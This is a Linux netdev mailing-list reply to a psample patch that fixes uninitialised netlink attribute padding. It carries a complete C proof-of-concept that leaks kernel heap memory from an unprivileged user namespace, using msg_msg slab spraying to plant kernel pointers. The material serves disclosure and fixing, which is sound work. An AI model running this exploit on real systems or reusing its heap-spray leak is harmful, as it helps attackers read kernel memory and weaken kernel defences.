Return-Path: <netdev+bounces-296180-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by mail.lfdr.de with LMTP
	id IlATGH4AJWqhCgIAu9opvQ
	(envelope-from <netdev+bounces-296180-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Sun, 07 Jun 2026 07:24:14 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id A2DF964ED90
	for <lists+netdev@lfdr.de>; Sun, 07 Jun 2026 07:24:13 +0200 (CEST)
Authentication-Results: mail.lfdr.de;
	dkim=pass header.d=asu.edu header.s=google header.b=NKs3SA8u;
	spf=pass (mail.lfdr.de: domain of "netdev+bounces-296180-lists+netdev=lfdr.de@vger.kernel.org" designates 2600:3c0a:e001:db::12fc:5321 as permitted sender) smtp.mailfrom="netdev+bounces-296180-lists+netdev=lfdr.de@vger.kernel.org";
	dmarc=pass (policy=none) header.from=asu.edu;
	arc=pass ("subspace.kernel.org:s=arc-20240116:i=2")
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id F17FA3014DBA
	for <lists+netdev@lfdr.de>; Sun,  7 Jun 2026 05:24:11 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 50A0826E165;
	Sun,  7 Jun 2026 05:24:11 +0000 (UTC)
X-Original-To: netdev@vger.kernel.org
Received: from mail-pl1-f180.google.com (mail-pl1-f180.google.com [209.85.214.180])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 33D681A08AF
	for <netdev@vger.kernel.org>; Sun,  7 Jun 2026 05:24:08 +0000 (UTC)
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1780809851; cv=pass; b=KPChUYAcyPUzjPDfy/MwErIJS2+76xWl0B1i62Hj9LC4Z5YQKl/b6HzAWZxYtEjREOiNlB7Yo34+Z+HQFIBZR1vO6iTwW1NCZT5x6f/dFSZp4D3uv56+3WTk+7b82Otf+9/Mabdc2HkbSYoQA0hl4fq9tW5nmH5YC3nxOiJc4j0=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1780809851; c=relaxed/simple;
	bh=8ZylpzfZQUr9EN+vbDfcTrJMRmunb0cS3Uv2utK6IG4=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=gNP4Z3cgKUDYn9fSXibr4dXlvVqjTaITlFP1Ng2gmzCz+v4uD+Jh6fxK8LlKSOrGw9VI8WR43VEi8yXSaYVhVdP23hvAs0kMOv0CeshQcyuCIq2uy9YzzXcdCJ4cOx2nXRwVnwkcYtGv8VAYSq42+DKSZ41g73u2RnmQvUESLvM=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=NKs3SA8u; arc=pass smtp.client-ip=209.85.214.180
Received: by mail-pl1-f180.google.com with SMTP id d9443c01a7336-2c0c3184c71so24603775ad.1
        for <netdev@vger.kernel.org>; Sat, 06 Jun 2026 22:24:08 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1780809848; cv=none;
        d=google.com; s=arc-20240605;
        b=PpI3cJ92ACA6H+YDr6vW1V5lELYQ84k6RdK+xkGF/cYqHzBWr99mxwe5AMjiX1dyOl
         27yeSWD0IGNmi486d2Njsx6M4XQnNB4gt8k9Cch1JiZ+XRSx/aGrfDPekvfxaR/P7pVt
         qwx+ATfqO9aaxdBnydfiXLOCCggYg5VxhQM2QLSb51gY97htRu5nUcju35Qcbiz7iw/G
         V4DIDG7l+gR9NsH5wC6FsdrU4bktZk1kptiEd1vEDk/kqMhrTZp+ux7uwV47lMUiSHtP
         bNjVWtFFUnYa48rg7OHz0an501MUM/v0oH2K//aFCQDhL3rZ4bD4HrDHEiL6BTKR2ZFj
         cw0Q==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=YYf0p2GPAk+azSs6ebEDr1igitCoz1vXpuzvadg/+P4=;
        fh=02FwAktCT3bAhPIrkeuyeSOT6cyBhCvN4+ZzvQ/PCis=;
        b=gwFLzbyi+EXZEgGdUTTKbk6XtyJXeHcMF0YsY1dR3ngEsnR4vp08eN6dkteqtKmK7m
         9WicexUDnI/TOGacUplFKI0PQYp0yqsMXRzJRxDWR7vTBMlLNfnfbYiGwj4ldriXSrSl
         W9pgjBl3kGkSrNPy8sx+9YDd2uI0gZN5SAUrlF4qJnXgwAI2r9vp2iM4oQkl9g52gMVg
         b4ZI4tzXueroNhR1Q1frvVEO080ncZA+ew31XLQ+z/OupsFUX215KWuSkt0vhuFR69og
         TTNewss0ZHInd2qk3TRTTXECcllffgjPBf52IGPINzFNPe7UYv3iT/SkXUca321Z1Kpn
         1pug==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1780809848; x=1781414648; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=YYf0p2GPAk+azSs6ebEDr1igitCoz1vXpuzvadg/+P4=;
        b=NKs3SA8umc1kUzHUY/UOjlzag+xeeo3Ne27NxlXHf2lrXyUcnJPALsxXfFTqQkQpbx
         jgrxXSULbeQCXmQAN9oRPemgxa0mFT/eUnocoOiwwMBg0Tysi4KKd30uYphQDnvJqeJO
         4dI2gjqVfsb6XwStlnh4s5HMqGrI2qK2UfWu38z7X4r8jVoWbygHO87/FIAb4ww91J/6
         tP4jWlO8m1BKEyvRiOzuJkECXIq4GuPGTl0stbnH5qa2y1bWo7b/2t0uDAf0PSGtDM2s
         DiSb2qfox5NAekTNxn8xuKqXjVFrvu5Hb1PaPuQM7Vte5bu4YN8p2N9a85fwWf7PAWDl
         YVaQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1780809848; x=1781414648;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=YYf0p2GPAk+azSs6ebEDr1igitCoz1vXpuzvadg/+P4=;
        b=G12cenzZBNPRLkY5IG8nSugvGDnvTlGCCzQk6ER99QALQwJKjnSCfcPJ43pCaDhC7a
         2jLY1zZUun6GfmQt8OFq0I3Wb0OhgEcRPIl4/hVlxExS9VypUuHFz/e8Qz+VtGDiB8XN
         FVwKEUCtCyjChRzxUR4+kUd0jq5iQwmdPfC75ZS8dYQjitk+DKbYVr5QeO+wiLtjQmYc
         uZjOvSnvk5TmMYj46JLUnhgc+BIseXMIPlgY6uStCHsM52Pt0vVp5reZMMACDZ24uJ1A
         jNIYiZdkHDVzqIKboJ7TPq3woWOs8qW/l4isFJHOPI+1oD7PkQAfbtBAZbLGlnLyDGrB
         kP7Q==
X-Gm-Message-State: AOJu0YxctwBo4yqbCJIuC8eFW1y2wJScUr9TBNiHcNgctPtpQWf4Na78
	vPTBzjaFXKmsUbVLJZYE/O8LN4SEWhE0UWrFmU2V+2AEFdGYtYrBdvXCfqhRX76n13blTylBG/o
	GVBDVEvyQKvVIBwkKSngPMwiMGqZ0YdJFzN4cKYcsJBO1YPhUgAwyRYa1
X-Gm-Gg: Acq92OHvChcppS3kcUU+Hm4cfwJQq/BCoHK/9IcdWudCisHqyEIW9PHbnAhIT9z6kuf
	oaNFNueEo+GJ4Ki/2VpVabsPnoyIqT+9EJ7pDM6YAkzWm5RiP5XK2dBWgnaSVWU/5eb3zPfRFpX
	1lsEGyBpiAz3SXzwUVhgsTv7+1eQ/rD8fJX7Iz76XO63olwYqFoHk4tMLLr61+skbB7Bp0SzgRy
	vdTjvHPwwbx4qf7jPC+aWflVH3z7hXTDFO/2UXG6X5OyBFMr00T2eH2n4QH+SMVR64BlUq2Ev9C
	BYcSxiH4XP3DWzvHQA==
X-Received: by 2002:a05:6a21:3a94:b0:39f:82bd:298 with SMTP id
 adf61e73a8af0-3b4cc9aec2emr13405903637.0.1780809848117; Sat, 06 Jun 2026
 22:24:08 -0700 (PDT)
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260607031640.2743713-1-xmei5@asu.edu>
In-Reply-To: <20260607031640.2743713-1-xmei5@asu.edu>
From: Xiang Mei <xmei5@asu.edu>
Date: Sat, 6 Jun 2026 22:23:57 -0700
X-Gm-Features: AVVi8Ce8IqnYLNvd85h2gqUt7ZZ7fxx9VhwLrxqjtXkEwElx7hnu2trDYvnjRQI
Message-ID: <CAPpSM+TSXt3n5-gDM18L=N9b9bDWsGgaKVv3e88i6E9PkWzfBg@mail.gmail.com>
Subject: Re: [PATCH net] psample: zero the netlink attribute padding in PSAMPLE_ATTR_DATA
To: netdev@vger.kernel.org, davem@davemloft.net
Cc: yotam.gi@gmail.com, edumazet@google.com, kuba@kernel.org, 
	pabeni@redhat.com, horms@kernel.org, bestswngs@gmail.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-Rspamd-Action: no action
X-Spamd-Result: default: False [-0.66 / 15.00];
	SUSPICIOUS_RECIPS(1.50)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=2];
	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c0a:e001:db::/64];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FREEMAIL_CC(0.00)[gmail.com,google.com,kernel.org,redhat.com];
	TAGGED_FROM(0.00)[bounces-296180-lists,netdev=lfdr.de];
	FROM_HAS_DN(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCVD_TLS_LAST(0.00)[];
	FORGED_SENDER(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	FORGED_RECIPIENTS(0.00)[m:netdev@vger.kernel.org,m:davem@davemloft.net,m:yotam.gi@gmail.com,m:edumazet@google.com,m:kuba@kernel.org,m:pabeni@redhat.com,m:horms@kernel.org,m:bestswngs@gmail.com,m:yotamgi@gmail.com,s:lists@lfdr.de];
	DKIM_TRACE(0.00)[asu.edu:+];
	ASN(0.00)[asn:63949, ipnet:2600:3c0a::/32, country:SG];
	MISSING_XM_UA(0.00)[];
	FORGED_SENDER_FORWARDING(0.00)[];
	TO_DN_NONE(0.00)[];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	ALIAS_RESOLVED(0.00)[];
	FORGED_RECIPIENTS_FORWARDING(0.00)[];
	RCPT_COUNT_SEVEN(0.00)[8];
	FORWARDED(0.00)[lists@lfdr.de];
	TAGGED_RCPT(0.00)[netdev];
	MIME_TRACE(0.00)[0:+]
X-Rspamd-Server: lfdr
X-Rspamd-Queue-Id: A2DF964ED90

Thanks for your attention to this bug. Here are some resources to help
you trigger the bug.

Required key configs:
```
CONFIG_PSAMPLE=3Dy
CONFIG_NET_ACT_SAMPLE=3Dy
CONFIG_NET_CLS_ACT=3Dy
CONFIG_NET_CLS_MATCHALL=3Dy
CONFIG_NET_SCH_INGRESS=3Dy
CONFIG_VETH=3Dy
CONFIG_PACKET=3Dy
CONFIG_USER_NS=3Dy
CONFIG_NET_NS=3Dy
```

Here is a PoC trigger the intended kernel data leak:
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/genetlink.h>
#include <linux/pkt_sched.h>
#include <linux/pkt_cls.h>
#include <linux/tc_act/tc_sample.h>
#include <linux/veth.h>
#include <arpa/inet.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define die(s) do { perror(s); exit(1); } while (0)

/* psample uapi (subset) */
#define PSAMPLE_GENL_NAME "psample"
#define PSAMPLE_NL_MCGRP_SAMPLE_NAME "packets"
#define PSAMPLE_ATTR_DATA 6
#define PSAMPLE_CMD_SAMPLE 0

#define TRUNC_SIZE 1301 /* not a multiple of 4 -> 3 padding bytes leak */

/* NLA_HDRLEN comes from <linux/netlink.h> */

/* ---- minimal netlink attribute builder ---- */
static int nla_put_(char *buf, int off, int type, const void *data, int len=
)
{
struct nlattr *a =3D (struct nlattr *)(buf + off);
a->nla_type =3D type;
a->nla_len =3D NLA_HDRLEN + len;
if (len)
memcpy((char *)a + NLA_HDRLEN, data, len);
return off + NLA_ALIGN(NLA_HDRLEN + len);
}
static int nla_put_u32_(char *b, int o, int t, uint32_t v) { return
nla_put_(b, o, t, &v, 4); }
static int nla_put_str_(char *b, int o, int t, const char *s) { return
nla_put_(b, o, t, s, strlen(s) + 1); }

/* returns offset just past the header; pass it to nest_end to fix up nla_l=
en */
static int nest_start(char *buf, int off, int type)
{
struct nlattr *a =3D (struct nlattr *)(buf + off);
a->nla_type =3D type | NLA_F_NESTED;
a->nla_len =3D NLA_HDRLEN;
return off + NLA_HDRLEN;
}
static int nest_end(char *buf, int hdr, int off)
{
struct nlattr *a =3D (struct nlattr *)(buf + hdr - NLA_HDRLEN);
a->nla_len =3D off - (hdr - NLA_HDRLEN);
return off;
}

static int nl_xchg(int fd, void *msg, int len, void *rsp, int rlen)
{
struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
if (sendto(fd, msg, len, 0, (void *)&sa, sizeof(sa)) < 0)
die("sendto");
int n =3D recv(fd, rsp, rlen, 0);
struct nlmsghdr *r =3D rsp;
if (n > 0 && r->nlmsg_type =3D=3D NLMSG_ERROR) {
struct nlmsgerr *e =3D NLMSG_DATA(r);
if (e->error)
fprintf(stderr, "[!] netlink ack: %s\n", strerror(-e->error));
}
return n;
}

/* ---- iface helpers ---- */
static int if_index(const char *name)
{
int fd =3D socket(AF_INET, SOCK_DGRAM, 0);
struct ifreq ifr =3D {};
strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) die("SIOCGIFINDEX");
close(fd);
return ifr.ifr_ifindex;
}
static void if_up(const char *name)
{
int fd =3D socket(AF_INET, SOCK_DGRAM, 0);
struct ifreq ifr =3D {};
strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) die("SIOCGIFFLAGS");
ifr.ifr_flags |=3D IFF_UP | IFF_RUNNING;
if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) die("SIOCSIFFLAGS");
close(fd);
}

static void veth_create(int rt)
{
char buf[1024] =3D {}, rsp[1024];
struct nlmsghdr *nh =3D (void *)buf;
struct ifinfomsg *ifi;
int off;

nh->nlmsg_type =3D RTM_NEWLINK;
nh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
nh->nlmsg_len =3D NLMSG_LENGTH(sizeof(*ifi));
ifi =3D NLMSG_DATA(nh);
ifi->ifi_family =3D AF_UNSPEC;
off =3D nh->nlmsg_len;
off =3D nla_put_str_(buf, off, IFLA_IFNAME, "veth0");
int li =3D nest_start(buf, off, IFLA_LINKINFO);
off =3D nla_put_str_(buf, li, IFLA_INFO_KIND, "veth");
int id =3D nest_start(buf, off, IFLA_INFO_DATA);
int pe =3D nest_start(buf, id, VETH_INFO_PEER);
off =3D pe + NLMSG_ALIGN(sizeof(struct ifinfomsg)); /* peer ifinfomsg */
off =3D nla_put_str_(buf, off, IFLA_IFNAME, "veth1");
off =3D nest_end(buf, pe, off);
off =3D nest_end(buf, id, off);
off =3D nest_end(buf, li, off);
nh->nlmsg_len =3D off;
nl_xchg(rt, buf, off, rsp, sizeof(rsp));
}

static void qdisc_ingress(int rt, int ifindex)
{
char buf[256] =3D {}, rsp[256];
struct nlmsghdr *nh =3D (void *)buf;
struct tcmsg *tc;
int off;

nh->nlmsg_type =3D RTM_NEWQDISC;
nh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
nh->nlmsg_len =3D NLMSG_LENGTH(sizeof(*tc));
tc =3D NLMSG_DATA(nh);
tc->tcm_family =3D AF_UNSPEC;
tc->tcm_ifindex =3D ifindex;
tc->tcm_handle =3D 0xffff0000; /* ffff:0 */
tc->tcm_parent =3D TC_H_INGRESS;
off =3D nla_put_str_(buf, nh->nlmsg_len, TCA_KIND, "ingress");
nh->nlmsg_len =3D off;
nl_xchg(rt, buf, off, rsp, sizeof(rsp));
}

/* matchall filter -> sample action (rate 1, group 1, trunc TRUNC_SIZE) */
static void filter_sample(int rt, int ifindex)
{
char buf[1024] =3D {}, rsp[1024];
struct nlmsghdr *nh =3D (void *)buf;
struct tcmsg *tc;
int off;

nh->nlmsg_type =3D RTM_NEWTFILTER;
nh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
nh->nlmsg_len =3D NLMSG_LENGTH(sizeof(*tc));
tc =3D NLMSG_DATA(nh);
tc->tcm_family =3D AF_UNSPEC;
tc->tcm_ifindex =3D ifindex;
tc->tcm_parent =3D 0xffff0000;
tc->tcm_info =3D (1 << 16) | htons(ETH_P_ALL); /* prio 1, proto all */
off =3D nla_put_str_(buf, nh->nlmsg_len, TCA_KIND, "matchall");

int opt =3D nest_start(buf, off, TCA_OPTIONS);
int act =3D nest_start(buf, opt, TCA_MATCHALL_ACT);
int e1 =3D nest_start(buf, act, 1);
off =3D nla_put_str_(buf, e1, TCA_ACT_KIND, "sample");
int aopt =3D nest_start(buf, off, TCA_ACT_OPTIONS);
struct tc_sample p =3D { .action =3D TC_ACT_PIPE, .index =3D 1 };
off =3D nla_put_(buf, aopt, TCA_SAMPLE_PARMS, &p, sizeof(p));
off =3D nla_put_u32_(buf, off, TCA_SAMPLE_RATE, 1);
off =3D nla_put_u32_(buf, off, TCA_SAMPLE_TRUNC_SIZE, TRUNC_SIZE);
off =3D nla_put_u32_(buf, off, TCA_SAMPLE_PSAMPLE_GROUP, 1);
off =3D nest_end(buf, aopt, off);
off =3D nest_end(buf, e1, off);
off =3D nest_end(buf, act, off);
off =3D nest_end(buf, opt, off);
nh->nlmsg_len =3D off;
nl_xchg(rt, buf, off, rsp, sizeof(rsp));
}

/* resolve psample family id + "packets" multicast group id */
static uint32_t psample_mcgrp(int gfd)
{
char buf[256] =3D {}, rsp[4096];
struct nlmsghdr *nh =3D (void *)buf;
struct genlmsghdr *gh;
int off;

nh->nlmsg_type =3D GENL_ID_CTRL;
nh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
nh->nlmsg_len =3D NLMSG_LENGTH(sizeof(*gh));
gh =3D NLMSG_DATA(nh);
gh->cmd =3D CTRL_CMD_GETFAMILY;
off =3D nla_put_str_(buf, nh->nlmsg_len, CTRL_ATTR_FAMILY_NAME,
PSAMPLE_GENL_NAME);
nh->nlmsg_len =3D off;

int n =3D nl_xchg(gfd, buf, off, rsp, sizeof(rsp));
struct nlmsghdr *r =3D (void *)rsp;
if (n <=3D 0 || r->nlmsg_type =3D=3D NLMSG_ERROR)
return 0;

/* walk attrs for CTRL_ATTR_MCAST_GROUPS -> {GRP_NAME, GRP_ID} */
struct genlmsghdr *g =3D NLMSG_DATA(r);
char *p =3D (char *)(g + 1);
int len =3D r->nlmsg_len - NLMSG_LENGTH(sizeof(*g));
for (; len > 0; len -=3D NLA_ALIGN(((struct nlattr *)p)->nla_len),
p +=3D NLA_ALIGN(((struct nlattr *)p)->nla_len)) {
struct nlattr *a =3D (void *)p;
if ((a->nla_type & NLA_TYPE_MASK) !=3D CTRL_ATTR_MCAST_GROUPS)
continue;
char *gp =3D (char *)a + NLA_HDRLEN;
int gl =3D a->nla_len - NLA_HDRLEN;
for (; gl > 0; gl -=3D NLA_ALIGN(((struct nlattr *)gp)->nla_len),
gp +=3D NLA_ALIGN(((struct nlattr *)gp)->nla_len)) {
struct nlattr *grp =3D (void *)gp;
char *ip =3D (char *)grp + NLA_HDRLEN;
int il =3D grp->nla_len - NLA_HDRLEN;
const char *name =3D NULL; uint32_t id =3D 0;
for (; il > 0; il -=3D NLA_ALIGN(((struct nlattr *)ip)->nla_len),
ip +=3D NLA_ALIGN(((struct nlattr *)ip)->nla_len)) {
struct nlattr *ia =3D (void *)ip;
int t =3D ia->nla_type & NLA_TYPE_MASK;
if (t =3D=3D CTRL_ATTR_MCAST_GRP_NAME)
name =3D (char *)ia + NLA_HDRLEN;
else if (t =3D=3D CTRL_ATTR_MCAST_GRP_ID)
id =3D *(uint32_t *)((char *)ia + NLA_HDRLEN);
}
if (name && !strcmp(name, PSAMPLE_NL_MCGRP_SAMPLE_NAME))
return id;
}
}
return 0;
}

/* Churn kmalloc-2k with msg_msg objects (each starts with two kernel heap
* pointers in its m_list) so the page the victim skb head later lands on is
* littered with 0xffff88.. bytes. INIT_ON_ALLOC is off, so a fresh skb-head
* slot inherits those bytes in its uninitialised tail padding. Without this=
,
* a quiet VM hands back zeroed pages and the leak, while real, stays zero. =
*/
#define SPRAY_SZ 1900 /* sizeof(msg_msg)~48 + 1900 -> kmalloc-2k */
#define SPRAY_CNT 256
static void slab_churn(void)
{
static struct { long mtype; char mtext[SPRAY_SZ]; } m;
int q[SPRAY_CNT], n =3D 0;
m.mtype =3D 1;
memset(m.mtext, 0x41, sizeof(m.mtext));
for (int i =3D 0; i < SPRAY_CNT; i++) {
if ((q[n] =3D msgget(IPC_PRIVATE, 0600 | IPC_CREAT)) < 0) break;
msgsnd(q[n++], &m, SPRAY_SZ, IPC_NOWAIT);
}
for (int i =3D 0; i < n; i++) { /* free most -> pages recycled, not reclaim=
ed */
if (i & 7) msgrcv(q[i], &m, SPRAY_SZ, 0, IPC_NOWAIT | MSG_NOERROR);
msgctl(q[i], IPC_RMID, NULL);
}
}

static int pkt_socket(void)
{
int fd =3D socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
if (fd < 0) die("socket(AF_PACKET)");
struct sockaddr_ll sll =3D {
.sll_family =3D AF_PACKET,
.sll_protocol =3D htons(ETH_P_ALL),
.sll_ifindex =3D if_index("veth0"),
};
if (bind(fd, (void *)&sll, sizeof(sll)) < 0) die("bind packet");
return fd;
}

/* scan one multicast message for PSAMPLE_ATTR_DATA padding bytes */
static int check_sample(struct nlmsghdr *nh)
{
struct genlmsghdr *g =3D NLMSG_DATA(nh);
if (g->cmd !=3D PSAMPLE_CMD_SAMPLE)
return 0;
char *p =3D (char *)(g + 1);
int len =3D nh->nlmsg_len - NLMSG_LENGTH(sizeof(*g));
for (; len > 0; len -=3D NLA_ALIGN(((struct nlattr *)p)->nla_len),
p +=3D NLA_ALIGN(((struct nlattr *)p)->nla_len)) {
struct nlattr *a =3D (void *)p;
if ((a->nla_type & NLA_TYPE_MASK) !=3D PSAMPLE_ATTR_DATA)
continue;
int payload =3D a->nla_len - NLA_HDRLEN;
int pad =3D NLA_ALIGN(a->nla_len) - a->nla_len;
unsigned char *q =3D (unsigned char *)a + a->nla_len;
int nz =3D 0;
for (int i =3D 0; i < pad; i++) nz |=3D q[i];
if (pad && nz) {
printf("[+] LEAK payload=3D%d pad=3D%d bytes:", payload, pad);
for (int i =3D 0; i < pad; i++) printf(" %02x", q[i]);
printf(" <- uninitialised kernel slab memory\n");
return 1;
}
}
return 0;
}

int main(void)
{
setvbuf(stdout, NULL, _IONBF, 0);

/* unprivileged user + net namespace -> CAP_NET_ADMIN in the new netns */
uid_t uid =3D getuid(), gid =3D getgid();
if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
die("unshare");
int f =3D open("/proc/self/setgroups", O_WRONLY);
if (f >=3D 0) { write(f, "deny", 4); close(f); }
char m[64];
f =3D open("/proc/self/uid_map", O_WRONLY);
snprintf(m, sizeof(m), "0 %u 1\n", uid); write(f, m, strlen(m)); close(f);
f =3D open("/proc/self/gid_map", O_WRONLY);
snprintf(m, sizeof(m), "0 %u 1\n", gid); write(f, m, strlen(m)); close(f);

if_up("lo");

int rt =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
if (rt < 0) die("socket(rtnl)");
veth_create(rt);
if_up("veth0");
if_up("veth1");
int idx1 =3D if_index("veth1");
qdisc_ingress(rt, idx1);
filter_sample(rt, idx1);

int gfd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
if (gfd < 0) die("socket(genl)");
uint32_t mcgrp =3D psample_mcgrp(gfd);
if (!mcgrp) { fprintf(stderr, "[!] psample family not found
(CONFIG_PSAMPLE?)\n"); return 1; }
if (setsockopt(gfd, SOL_NETLINK, NETLINK_ADD_MEMBERSHIP, &mcgrp,
sizeof(mcgrp)) < 0)
die("NETLINK_ADD_MEMBERSHIP");
printf("[*] joined PSAMPLE 'packets' mcgrp, trunc_size=3D%d\n", TRUNC_SIZE)=
;

int pkt =3D pkt_socket();
unsigned char frame[1500];
memset(frame, 0x41, sizeof(frame));
memset(frame, 0xff, 6); /* broadcast dst */

int leaks =3D 0;
for (int round =3D 0; round < 200 && leaks < 5; round++) {
slab_churn(); /* plant kernel pointers in kmalloc-2k before sampling */
write(pkt, frame, sizeof(frame));

char rbuf[16384];
int n =3D recv(gfd, rbuf, sizeof(rbuf), MSG_DONTWAIT);
if (n <=3D 0) { usleep(5000); continue; }
struct nlmsghdr *nh =3D (void *)rbuf;
for (; NLMSG_OK(nh, (unsigned)n); nh =3D NLMSG_NEXT(nh, n))
leaks +=3D check_sample(nh);
}

if (leaks)
printf("[+] CONFIRMED: %d sample(s) leaked non-zero padding bytes\n", leaks=
);
else
printf("[-] no non-zero padding seen this run (bug is still real)\n");
return leaks ? 0 : 2;
}
```

Let me know if you have any questions about this bug.

Xiang

On Sat, Jun 6, 2026 at 8:16=E2=80=AFPM Xiang Mei <xmei5@asu.edu> wrote:
>
> psample_sample_packet() open-codes the PSAMPLE_ATTR_DATA attribute.
> It reserves nla_total_size(data_len) bytes via skb_put() but only writes
> NLA_HDRLEN + data_len of them, so when data_len is not a multiple of 4 th=
e
> up to 3 trailing alignment-padding bytes are left uninitialised.  The skb
> head comes from kmalloc_reserve(), which does not zero memory, so those
> bytes hold stale slab contents that are then broadcast to all listeners o=
n
> the PSAMPLE_NL_MCGRP_SAMPLE multicast group, leaking kernel heap memory t=
o
> userspace.
>
> Zero the trailing padding after the payload copy.
>
> Fixes: 6ae0a6286171 ("net: Introduce psample, a new genetlink channel for=
 packet sampling")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Assisted-by: Claude:claude-opus-4-8
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  net/psample/psample.c | 3 +++
>  1 file changed, 3 insertions(+)
>
> diff --git a/net/psample/psample.c b/net/psample/psample.c
> index 7763662036fb..26220dca0f12 100644
> --- a/net/psample/psample.c
> +++ b/net/psample/psample.c
> @@ -485,6 +485,9 @@ void psample_sample_packet(struct psample_group *grou=
p,
>
>                 if (skb_copy_bits(skb, 0, nla_data(nla), data_len))
>                         goto error;
> +
> +               memset((unsigned char *)nla + nla->nla_len, 0,
> +                      nla_padlen(data_len));
>         }
>
>  #ifdef CONFIG_INET
> --
> 2.43.0
>

